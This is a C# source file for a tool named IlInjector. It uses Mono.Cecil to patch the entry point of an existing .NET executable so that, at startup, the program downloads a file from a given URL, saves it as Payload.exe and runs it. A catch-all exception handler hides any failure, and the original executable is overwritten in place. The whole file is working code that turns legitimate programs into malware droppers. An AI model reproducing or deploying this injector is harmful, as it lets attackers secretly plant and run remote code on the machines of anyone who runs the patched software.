using System;
using System.Diagnostics;
using System.IO;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace Injector
{
    internal class IlInjector
    {
        public bool InjectToExecutable(string executablePath, string payloadUrl)
        {
            if (!File.Exists(executablePath))
                return false;

            const string payloadName = "Payload.exe";

            try
            {
                //Reading the .NET target assembly
                AssemblyDefinition asm = AssemblyDefinition.ReadAssembly(executablePath);

                var method = asm.MainModule.EntryPoint;

                var mbi = method.Body.Instructions;

                if (mbi[mbi.Count - 1].OpCode == OpCodes.Ret)
                    mbi.Remove(mbi[mbi.Count - 1]);

                method.Body.Variables.Add(new VariableDefinition(asm.MainModule.Import(typeof (byte[]))));
                mbi.Add(Instruction.Create(OpCodes.Newobj,
                    asm.MainModule.Import(typeof (System.Net.WebClient).GetConstructors()[0])));
                mbi.Add(Instruction.Create(OpCodes.Ldstr, payloadUrl));
                mbi.Add(Instruction.Create(OpCodes.Call,
                    asm.MainModule.Import(typeof (System.Net.WebClient).GetMethod("DownloadData",
                        new Type[] {typeof (string)}))));

                mbi.Add(Instruction.Create(OpCodes.Stloc_0));
                mbi.Add(Instruction.Create(OpCodes.Ldstr, payloadName));
                mbi.Add(Instruction.Create(OpCodes.Ldloc_0));
                mbi.Add(Instruction.Create(OpCodes.Call,
                    asm.MainModule.Import(typeof (File).GetMethod("WriteAllBytes",
                        new Type[] {typeof (string), typeof (byte[])}))));


                // Run downloaded executable
                var pStartMethod = typeof (Process).GetMethod("Start", new Type[] {typeof (string)});
                var pStartRef = asm.MainModule.Import(pStartMethod);
                mbi.Add(Instruction.Create(OpCodes.Ldstr, payloadName));
                mbi.Add(Instruction.Create(OpCodes.Call, pStartRef));

                // Add exception handler to handle any error
                var il = method.Body.GetILProcessor();
                var nopInst = il.Create(OpCodes.Nop);

                var retInst = il.Create(OpCodes.Ret);
                var leaveInst = il.Create(OpCodes.Leave, retInst);

                il.InsertAfter(mbi[mbi.Count - 1], nopInst);
                il.InsertAfter(nopInst, leaveInst);
                il.InsertAfter(leaveInst, retInst);

                var handler = new ExceptionHandler(ExceptionHandlerType.Catch)
                {
                    TryStart = mbi[0],
                    TryEnd = nopInst,
                    HandlerStart = nopInst,
                    HandlerEnd = retInst,
                    CatchType = asm.MainModule.Import(typeof (Exception)),
                };

                method.Body.ExceptionHandlers.Add(handler);

                asm.Write(executablePath);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }
    }
}